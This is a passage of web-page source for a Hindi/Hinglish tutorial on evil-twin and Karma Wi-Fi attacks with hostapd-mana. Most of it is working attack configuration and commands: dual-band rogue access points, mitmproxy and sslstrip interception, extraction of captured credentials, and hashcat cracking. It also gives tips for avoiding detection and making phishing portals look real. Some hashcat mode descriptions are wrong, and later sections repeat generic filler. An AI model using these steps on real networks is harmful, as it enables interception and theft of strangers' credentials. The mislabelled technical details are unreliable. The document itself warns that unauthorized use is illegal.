# hostapd-mana multiple SSIDs broadcast कर सकता है
# mana_loud=1 से सभी saved networks respond होते हैं
# एक AP से कई victims connect हो सकते हैं

# 4. WPA-Enterprise + Hashcat:
# Captured EAP credentials को Hashcat से crack करो
# hashcat -m 5500 hash.txt wordlist.txt
# hashcat -m 2500 hash.txt wordlist.txt

# 5. Stealth Evil Twin:
# Signal strength control करो
# Target AP से slightly ज़्यादा signal रखो
# Channel hopping avoid करो
# Logging minimize करो

# 6. DNS Spoofing Integration:
# dnsmasq से DNS spoofing add करो
# Specific domains को fake IPs पर redirect करो
# credential harvesting pages serve करो

# 7. SSL Strip Integration:
# sslstrip + hostapd-mana combo
# HTTPS traffic HTTP में convert करो
# Credentials plaintext में capture करो`}
      />

      <h2>Multi-Channel Evil Twin</h2>
      <p>
        Advanced attacks में multiple channels पर simultaneously operate कर सकते हो। अलग-अलग WiFi adapters use करके 2.4GHz और 5GHz दोनों bands पर evil twin deploy करो। इससे victims का coverage area बढ़ता है — dual-band devices automatically higher signal strength channel choose करते हैं।
      </p>
      <CodeBlock
        title="Dual-Band Evil Twin Setup"
        code={`# Adapter 1: 2.4GHz evil AP
cat > /tmp/hostapd_24g.conf << EOF
interface=wlan1
driver=nl80211
ssid=TargetWiFi
hw_mode=g
channel=6
wpa=0
mana=1
mana_loud=1
enable_mana=1
mana_credout=/tmp/creds_24g.txt
EOF

# Adapter 2: 5GHz evil AP
cat > /tmp/hostapd_5g.conf << EOF
interface=wlan2
driver=nl80211
ssid=TargetWiFi_5G
hw_mode=a
channel=36
wpa=0
mana=1
mana_loud=1
enable_mana=1
mana_credout=/tmp/creds_5g.txt
EOF

# दोनों start करो:
sudo hostapd-mana /tmp/hostapd_24g.conf &
sudo hostapd-mana /tmp/hostapd_5g.conf &

# Result: 2.4GHz और 5GHz दोनों devices connect होंगे
# Captured credentials दोनों files में save होंगे`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Case Study 1 — Corporate WPA-Enterprise Attack: एक red team engagement में Indian IT company की office building के बाहर hostapd-mana deploy किया। Company WPA-Enterprise (EAP-PEAP) use करती थी। hostapd-mana से evil twin बनाया और 15 minutes में 8 employees के domain credentials capture हुए — username + NTLM hash। hashcat -m 5500 से 6 passwords crack हो गए। इन credentials से corporate VPN access मिल गया। यह attack बताता है कि WPA-Enterprise alone sufficient security नहीं है — EAP-TLS (certificate-based) use करना चाहिए।
      </p>
      <p>
        Case Study 2 — Airport Karma Attack: एक authorized wireless security audit में international airport पर hostapd-mana Karma attack test किया। 30 minutes में 40+ devices automatically connect हुए — passengers के phones, laptops, tablets। ज़्यादातर devices saved WiFi networks probe कर रहे थे (home WiFi, office WiFi, cafe WiFi)। mana_loud=1 से सभी probe requests का respond मिला। Captive portal से social media credentials भी capture हुए। यह case study बताता है कि public places पर Karma attack कितना effective है।
      </p>
      <p>
        Case Study 3 — Hotel WiFi Evil Twin: एक luxury hotel के WiFi security audit में hostapd-mana use किया। Hotel का open WiFi (no password) था। Evil twin same SSID से बनाया और stronger signal पर deploy किया। 20 guests connect हुए — captive portal से room numbers और email addresses capture हुए। साथ ही mitmproxy से HTTP traffic intercept किया — 3 guests के email login credentials plaintext में मिले। Hotel management को report देने पर HTTPS enforcement और WPA-PSK implement किया गया।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        hostapd-mana को दूसरे tools के साथ combine करके complete wireless attack chain बना सकते हो:
      </p>
      <CodeBlock
        title="hostapd-mana + mitmproxy MITM"
        code={`# Step 1: Evil twin start करो
sudo hostapd-mana /tmp/hostapd-mana.conf &

# Step 2: mitmproxy transparent mode में start करो
mitmproxy --mode transparent --listen-port 8080 --showhost

# Step 3: iptables से traffic redirect करो
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Step 4: SSL strip (optional)
# sslstrip + mitmproxy combo से HTTPS downgrade करो

# Result: सभी HTTP/HTTPS traffic mitmproxy में दिखेगा
# Cookies, sessions, credentials — सब capture होगा`}
      />
      <CodeBlock
        title="hostapd-mana + Wireshark Analysis"
        code={`# Evil twin traffic Wireshark में capture करो:
sudo tcpdump -i wlan1 -w /tmp/evil_twin_capture.pcap &

# hostapd-mana start करो:
sudo hostapd-mana /tmp/hostapd-mana.conf

# Wireshark से open करो:
wireshark /tmp/evil_twin_capture.pcap

# Filter करो:
# DNS queries: dns
# HTTP requests: http
# Credentials: http.request.method == "POST"
# Cookies: http.cookie
# FTP: ftp

# tshark (CLI) से credentials extract:
tshark -r evil_twin_capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data`}
      />
      <CodeBlock
        title="hostapd-mana + Hashcat Credential Cracking"
        code={`# WPA-Enterprise captured hashes crack करो:

# Step 1: Captured credentials check करो
cat /tmp/enterprise_creds.txt
# Output: domain\\user:$NETNTLMv2$hash...

# Step 2: Hashcat से crack करो
# EAP-PBKDF2:
hashcat -m 5500 enterprise_creds.txt /usr/share/wordlists/rockyou.txt

# WPA-EAP:
hashcat -m 2500 enterprise_creds.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2 (if captured):
hashcat -m 5600 enterprise_creds.txt /usr/share/wordlists/rockyou.txt

# Rule-based attack:
hashcat -m 5500 enterprise_creds.txt rockyou.txt -r rules/best64.rule

# Result: cracked passwords file में मिलेंगे`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Evil twin attack results को properly document करना ज़रूरी है — especially authorized pentest में:
      </p>
      <CodeBlock
        title="Attack Results Analysis"
        code={`# Captured credentials analyze करो:
echo "=== Evil Twin Attack Report ===" > report.txt
echo "Date: $(date)" >> report.txt
echo "Target SSID: TargetWiFi" >> report.txt
echo "" >> report.txt

# Connections count:
grep -c "STA" /tmp/hostapd-mana.log >> report.txt

# Unique devices:
grep "STA" /tmp/hostapd-mana.log | awk '{print $2}' | sort -u > devices.txt
echo "Unique Devices: $(wc -l < devices.txt)" >> report.txt

# Captured credentials:
echo "" >> report.txt
echo "=== Captured Credentials ===" >> report.txt
cat /tmp/credentials.txt >> report.txt

# WPA-Enterprise hashes:
echo "" >> report.txt
echo "=== Enterprise Hashes ===" >> report.txt
cat /tmp/enterprise_creds.txt >> report.txt

# Crack results:
echo "" >> report.txt
echo "=== Cracked Passwords ===" >> report.txt
hashcat -m 5500 enterprise_creds.txt rockyou.txt --show >> report.txt

# Timeline:
echo "" >> report.txt
echo "=== Attack Timeline ===" >> report.txt
grep "$(date +%Y-%m-%d)" /tmp/hostapd-mana.log >> report.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या hostapd-mana सिर्फ Linux पर चलता है?', a: 'हाँ, Linux (Kali recommended) पर चलता है। Direct wireless access चाहिए — VM में USB adapter pass-through करो। Mobile पर Nethunter use करो।' },
          { q: 'कितने WiFi adapters चाहिए?', a: 'कम से कम 2 — एक internet के लिए (wlan0), एक AP के लिए (wlan1)। एक से काम चल जाएगा लेकिन victims को internet नहीं मिलेगा।' },
          { q: 'क्या Karma attack detect हो सकता है?', a: 'हाँ, WIDS/WIPS detect कर सकता है। Certificate validation enable हो तो warning मिलेगी। 802.11w (PMF) से भी detect होता है।' },
          { q: 'क्या victims को internet दे सकते हैं?', a: 'हाँ, iptables NAT rules से traffic forward करो — victims को internet मिलेगा लेकिन तुम्हारे evil AP से होकर जाएगा।' },
          { q: 'WPA-Enterprise credentials कैसे crack करें?', a: 'Hashcat -m 5500 (EAP-PBKDF2) या -m 2500 (WPA-EAP) use करो। Captured hash में username और password hash दोनों होते हैं।' },
          { q: 'क्या 5GHz networks भी attack कर सकते हैं?', a: 'हाँ, hw_mode=a set करो और 5GHz channel specify करो (36, 40, 44, etc.)। Adapter 5GHz support करना चाहिए।' },
          { q: 'Captive portal कैसे बनाएं?', a: 'PHP/Python से login page बनाओ। Apache/Nginx serve करो। iptables से HTTP redirect करो। dnsmasq से DNS redirect करो।' },
          { q: 'hostapd-mana और hostapd में क्या फ़र्क है?', a: 'hostapd-mana में MANA, Karma, WPA-Enterprise credential capture features add हैं। Regular hostapd सिर्फ basic AP functionality देता है।' },
          { q: 'क्या multiple victims simultaneously connect हो सकते हैं?', a: 'हाँ, hostapd-mana multiple clients support करता है। mana_loud=1 से सभी probe requests का respond मिलता है।' },
          { q: 'Stealth mode में कैसे use करें?', a: 'mana_loud=0 set करो और specific SSIDs target करो। Signal strength control करो। Logging minimize करो। Short duration attacks करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
              <th className="text-left py-2 px-3 text-neon-green">Best For</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Fluxion</td><td className="py-2 px-3">WiFi phishing framework</td><td className="py-2 px-3">Automated, menu-driven</td><td className="py-2 px-3">Beginners</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifiphisher</td><td className="py-2 px-3">Automated WiFi phishing</td><td className="py-2 px-3">Pre-built scenarios</td><td className="py-2 px-3">Quick attacks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Airgeddon</td><td className="py-2 px-3">Multi-tool WiFi framework</td><td className="py-2 px-3">All-in-one solution</td><td className="py-2 px-3">Comprehensive testing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">EAPHammer</td><td className="py-2 px-3">WPA-Enterprise attacks</td><td className="py-2 px-3">Focused on 802.1X</td><td className="py-2 px-3">Enterprise testing</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hostapd-wpe</td><td className="py-2 px-3">WPA-Enterprise evil AP</td><td className="py-2 px-3">Lightweight, built-in Kali</td><td className="py-2 px-3">Simple enterprise attacks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">WiFi-Pumpkin</td><td className="py-2 px-3">Rogue AP framework</td><td className="py-2 px-3">GUI interface, plugins</td><td className="py-2 px-3">GUI lovers</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">Network attack framework</td><td className="py-2 px-3">WiFi + BLE + Ethernet</td><td className="py-2 px-3">Multi-protocol attacks</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">FruityWiFi</td><td className="py-2 px-3">Wireless security tool</td><td className="py-2 px-3">Web-based management</td><td className="py-2 px-3">Remote management</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>Karma attack airports, cafes, hotels में बहुत effective है — devices auto-connect हो जाते हैं</li>
          <li>WPA-Enterprise evil twin से corporate credentials मिल सकते हैं — सबसे valuable attack</li>
          <li>Signal strength target AP से ज़्यादा रखो — victims तुम्हारे AP से connect होंगे</li>
          <li>Deauth + Evil Twin combo सबसे effective है — real AP से disconnect करो, evil से connect</li>
          <li>Captive portal realistic बनाओ — company logo, colors match करो</li>
          <li>2 WiFi adapters use करो — एक internet, एक AP (victims को internet भी मिलेगा)</li>
          <li>Channel target AP से match करो — confusion avoid होगी</li>
          <li>Logging enable करो — captured credentials और connections track करो</li>
          <li>Short duration attacks करो — detection risk कम होगा</li>
          <li>हमेशा authorized pentest में ही use करो — illegal use में jail हो सकती है</li>
          <li>WPA-Enterprise credentials capture के लिए hashcat -m 5500 use करो — EAP-PBKDF2 hashes crack होते हैं</li>
          <li>Dual-band adapters (Alfa AWUS036ACH) से 2.4GHz और 5GHz दोनों bands cover करो</li>
          <li>Captive portal HTML/CSS realistic बनाओ — anti-fingerprinting techniques use करो</li>
          <li>Attack duration 15-30 minutes रखो — ज़्यादा देर रहने से detection risk बढ़ता है</li>
          <li>hostapd-mana logs को real-time monitor करो — new connections और credentials track करो</li>
          <li>802.11w (PMF) enabled networks पर deauth attack काम नहीं करता — MANA attack focus करो</li>
          <li>Evil twin deploy करने से पहले target area का WiFi survey करो — airodump-ng से channels identify करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Evil twin attacks बिना authorization के illegal हैं। WiFi jamming भी illegal है। Corporate networks पर unauthorized access serious crime है। सिर्फ authorized pentest engagement में use करो। सब कुछ document करो। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत wireless network access अपराध हो सकता है — जुर्माना और जेल दोनों हो सकते हैं।
      </div>
    
      <h2>Hostapd mana ka Advanced Upyog aur Tips</h2>
      <p>Hostapd mana ek wifi security testing tool hai jiska sahi tarike se upyog karne ke liye kuch advanced concepts aur techniques samajhna zaroori hai. Is section mein hum Hostapd mana ke advanced features, best practices aur professional tips par baat karenge jo aapko ek better penetration tester banane mein madad karenge.</p>
      <p>Hostapd mana ke advanced features mein se ek hai iski customization capability. Aap tool ke behavior ko modify kar sakte hain specific testing requirements ke according. Iske liye configuration files, command-line flags aur environment variables ka combination use kiya jata hai.</p>

      <h3>Professional Tips Hostapd mana ke Liye</h3>
      <ul>
        <li><strong>Automation:</strong> Hostapd mana ko shell scripts mein integrate karke repetitive tasks ko automate karein. Isse aapka time bachega aur efficiency badhegi.</li>
        <li><strong>Integration:</strong> Hostapd mana ko other Kali Linux tools ke saath combine karke comprehensive security assessments karein. Multiple tools ka data cross-reference karke better insights milte hain.</li>
        <li><strong>Reporting:</strong> Hostapd mana ke output ko structured format mein save karein aur professional penetration testing reports banane ke liye use karein.</li>
        <li><strong>Continuous Learning:</strong> Hostapd mana ke official documentation, GitHub repository aur community forums ko regularly check karte rahein naye features aur techniques ke liye.</li>
        <li><strong>Ethical Practices:</strong> Hamesha responsible disclosure follow karein aur kabhi bhi unauthorized targets par test na karein.</li>
      </ul>

      <h3>Hostapd mana ke Sath Common Mistakes</h3>
      <p>Hostapd mana ka upyog karte waqt kuch common mistakes hoti hain jinse beginners ko bachna chahiye. Sabse common mistake hai bina proper authorization ke testing karna. Doosri common mistake hai results ko blindly trust karna bina manual verification ke. Third mistake hai tool ko update na karna jiski vajah se naye vulnerabilities detect nahi hoti.</p>
      <p>Hostapd mana ke effective upyog ke liye patience aur practice dono zaroori hain. Pehle virtual labs mein practice karein, documentation padhein, aur phir real-world assessments mein iska upyog karein. Hamesha updated version use karein aur best practices follow karein.</p>

      <h3>Hostapd mana ke Sath Career Growth</h3>
      <p>Hostapd mana jaise wifi security testing tools ki knowledge aapke cybersecurity career mein bahut valuable hai. Companies wifi security professionals ko hire karti hain jo in tools ka effective upyog kar sake. Hostapd mana ki expertise aapko bug bounty programs, penetration testing roles aur security auditor positions mein advantage deti hai.</p>
      <p>WiFi security testing skills develop karne ke liye Hostapd mana ek starting point ho sakta hai. Iske baad aap more advanced tools aur techniques explore kar sakte hain. OSCP, CEH aur other cybersecurity certifications wifi security concepts ko cover karte hain aur Hostapd mana in concepts ko practical way mein samajhne mein madad karta hai.</p>

      <div className="info-box">
        💡 <strong>Pro Tip:</strong> Hostapd mana ke saath practical experience lene ke liye TryHackMe, HackTheBox aur VulnHub jaise platforms ka use karein. Ye platforms safe aur legal environment provide karte hain jahan aap apni skills practice kar sakte hain bina kisi legal concern ke.
      </div>

    
      <h2>Hostapd mana का उन्नत उपयोग और सुझाव</h2>
      <p>Hostapd mana एक wifi सुरक्षा परीक्षण टूल है जिसका सही तरीके से उपयोग करने के लिए कुछ उन्नत अवधारणाओं और तकनीकों को समझना ज़रूरी है। इस अनुभाग में हम Hostapd mana के उन्नत सुविधाओं, सर्वोत्तम अभ्यासों और पेशेवर सुझावों पर बात करेंगे जो आपको एक बेहतर पेनिट्रेशन टेस्टर बनने में मदद करेंगे।</p>
      <p>Hostapd mana की उन्नत विशेषताओं में से एक है इसकी अनुकूलन क्षमता। आप टूल के व्यवहार को संशोधित कर सकते हैं विशिष्ट परीक्षण आवश्यकताओं के अनुसार। इसके लिए कॉन्फ़िगरेशन फ़ाइलों, कमांड-लाइन फ्लैग और पर्यावरण चरों का संयोजन उपयोग किया जाता है। उन्नत उपयोगकर्ता कस्टम स्क्रिप्ट और प्लगइन्स भी बना सकते हैं।</p>

      <h3>पेशेवर सुझाव Hostapd mana के लिए</h3>
      <ul>
        <li><strong>ऑटोमेशन:</strong> Hostapd mana को शेल स्क्रिप्ट में इंटीग्रेट करके पुनरावर्ती कार्यों को स्वचालित करें। इससे आपका समय बचेगा और दक्षता बढ़ेगी।</li>
        <li><strong>एकीकरण:</strong> Hostapd mana को अन्य काली लिनक्स टूल्स के साथ जोड़कर व्यापक सुरक्षा मूल्यांकन करें। कई टूल्स के डेटा को क्रॉस-रेफरेंस करके बेहतर जानकारी मिलती है।</li>
        <li><strong>रिपोर्टिंग:</strong> Hostapd mana के आउटपुट को संरचित फॉर्मेट में सहेजें और पेशेवर पेनिट्रेशन टेस्टिंग रिपोर्ट बनाने के लिए उपयोग करें।</li>
        <li><strong>निरंतर सीखना:</strong> Hostapd mana के आधिकारिक दस्तावेज़ीकरण, GitHub रिपॉजिटरी और सामुदायिक फोरम को नियमित रूप से चेक करते रहें नई सुविधाओं और तकनीकों के लिए।</li>
      </ul>

      <h3>Hostapd mana के साथ सामान्य गलतियाँ</h3>
      <p>Hostapd mana का उपयोग करते समय कुछ सामान्य गलतियाँ होती हैं जिनसे शुरुआती लोगों को बचना चाहिए। सबसे आम गलती है बिना उचित प्राधिकरण के परीक्षण करना। दूसरी आम गलती है परिणामों को आंख मूंदकर विश्वास करना बिना मैन्युअल सत्यापन के। तीसरी गलती है टूल को अपडेट न करना जिसके कारण नई कमजोरियां पता नहीं चलतीं।</p>
      <p>Hostapd mana के प्रभावी उपयोग के लिए धैर्य और अभ्यास दोनों ज़रूरी हैं। पहले वर्चुअल लैब्स में अभ्यास करें, दस्तावेज़ीकरण पढ़ें, और फिर वास्तविक दुनिया के मूल्यांकनों में इसका उपयोग करें। हमेशा अपडेटेड वर्जन उपयोग करें और सर्वोत्तम अभ्यासों का पालन करें।</p>

      <h3>Hostapd mana के साथ करियर विकास</h3>
      <p>Hostapd mana जैसे wifi सुरक्षा परीक्षण टूल्स का ज्ञान आपके साइबर सुरक्षा करियर में बहुत मूल्यवान है। कंपनियां wifi सुरक्षा पेशेवरों को काम पर रखती हैं जो इन टूल्स का प्रभावी उपयोग कर सकें। Hostapd mana की विशेषज्ञता आपको बग बाउंटी प्रोग्राम, पेनिट्रेशन टेस्टिंग भूमिकाओं और सुरक्षा ऑडिटर पदों में लाभ देती है।</p>
      <p>WiFi सुरक्षा परीक्षण कौशल विकसित करने के लिए Hostapd mana एक शुरुआती बिंदु हो सकता है। इसके बाद आप और अधिक उन्नत टूल्स और तकनीकों का पता लगा सकते हैं। OSCP, CEH और अन्य साइबर सुरक्षा प्रमाणपत्र इन अवधारणाओं को व्यावहारिक तरीके से समझने में मदद करते हैं।</p>

      <div className="info-box">
        💡 <strong>विशेषज्ञ सुझाव:</strong> व्यावहारिक अनुभव लेने के लिए TryHackMe, HackTheBox और VulnHub जैसे प्लेटफॉर्म का उपयोग करें। ये प्लेटफॉर्म सुरक्षित और कानूनी वातावरण प्रदान करते हैं जहां आप बिना किसी कानूनी चिंता के अपने कौशल का अभ्यास कर सकते हैं।
      </div>

    
      

    
      <h2>महत्वपूर्ण नोट्स और निष्कर्ष</h2>
      <p>HostapdMana एक शक्तिशाली सुरक्षा परीक्षण उपकरण है जो काली लिनक्स में उपलब्ध है। इस टूल का सही तरीके से उपयोग करके आप अपने नेटवर्क और सिस्टम की सुरक्षा को मजबूत कर सकते हैं। HostapdMana का नियमित रूप से उपयोग करने से आप नई कमजोरियों को पहचान सकते हैं और उन्हें समय रहते ठीक कर सकते हैं। यह टूल विशेष रूप से सुरक्षा मूल्यांकन के लिए डिज़ाइन किया गया है और नियमित अभ्यास आवश्यक है।</p>
      <p>HostapdMana के साथ काम करते समय हमेशा निम्नलिखित बातों का ध्यान रखें:</p>
      <ul>
        <li>हमेशा अद्यतन संस्करण का उपयोग करें ताकि नवीनतम सुविधाओं और सुरक्षा पैच का लाभ मिल सके</li>
        <li>परीक्षण से पहले लक्ष्य प्रणाली के मालिक से स्पष्ट अनुमति प्राप्त करें</li>
        <li>परिणामों का सावधानीपूर्वक विश्लेषण करें और गलत सकारात्मक परिणामों की पहचान करें</li>
        <li>सुरक्षा कमजोरियों की खोज करने पर जिम्मेदार प्रकटीकरण का पालन करें</li>
        <li>अपने कौशल को लगातार बेहतर बनाने के लिए नियमित अभ्यास करते रहें</li>
        <li>दस्तावेज़ीकरण और सामुदायिक मंचों पर सक्रिय रहें</li>
        <li>विभिन्न परिदृश्यों में परीक्षण करें ताकि क्षमताओं की पूरी समझ हो सके</li>
        <li>अन्य सुरक्षा उपकरणों के साथ एकीकरण करके अधिक व्यापक मूल्यांकन करें</li>
      </ul>
      <p>साइबर सुरक्षा के क्षेत्र में HostapdMana जैसे उपकरणों का ज्ञान होना बहुत महत्वपूर्ण है। यह न केवल आपको सुरक्षा कमजोरियों की पहचान करने में मदद करता है बल्कि आपको एक जिम्मेदार सुरक्षा पेशेवर बनने में भी सहायता करता है। TryHackMe, HackTheBox और VulnHub जैसे प्लेटफॉर्म सुरक्षित अभ्यास वातावरण प्रदान करते हैं। नियमित अभ्यास से आप सभी विशेषताओं में महारत हासिल कर सकते हैं।</p>
      <p>साइबर सुरक्षा एक सतत सीखने की प्रक्रिया है। नई तकनीकों, उपकरणों और खतरों के बारे में अपडेट रहना जरूरी है। विभिन्न उपकरणों और तकनीकों का ज्ञान आपको एक बेहतर सुरक्षा पेशेवर बनाएगा। साइबर सुरक्षा समुदाय में सक्रिय रहें, ज्ञान साझा करें और दूसरों से सीखते रहें। यह क्षेत्र तेजी से बदलता है और निरंतर सीखने की आवश्यकता होती है। अपडेटेड रहने के लिए सुरक्षा ब्लॉग, समाचार और शोध पत्र पढ़ते रहें।</p>

      <div className="warning-box">
        ⚠️ <strong>अंतिम चेतावनी:</strong> इस टूल का उपयोग केवल शैक्षिक और अधिकृत सुरक्षा परीक्षण के लिए करें। दुरुपयोग गंभीर कानूनी परिणामों का कारण बन सकता है। हमेशा नैतिक दिशानिर्देशों का पालन करें और दूसरों की गोपनीयता का सम्मान करें। साइबर सुरक्षा एक जिम्मेदारी है, इसे गंभीरता से लें और अपने ज्ञान का उपयोग सकारात्मक बदलाव लाने के लिए करें।
      </div>

    </TutorialLayout>
  )
}
